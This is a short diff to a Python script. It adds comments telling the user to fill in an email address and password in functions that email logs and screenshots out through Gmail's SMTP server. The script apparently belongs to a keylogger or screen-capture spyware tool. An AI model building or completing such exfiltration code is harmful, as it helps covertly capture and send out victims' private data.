@@ -146,6 +146,7 @@ def send_logs(log_content):
 def send_screenshot():
     message = MIMEMultipart()
     message["Subject"] = "Screenshot"
+    # Set desired address/login and password:
     message["From"] = "email address"
     message["To"] = "email address"
 
@@ -156,6 +157,7 @@ def send_screenshot():
     message.attach(image)
 
     with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+        # Set desired address/login and password:
         smtp.login("email address", "password")
         smtp.send_message(message)
 
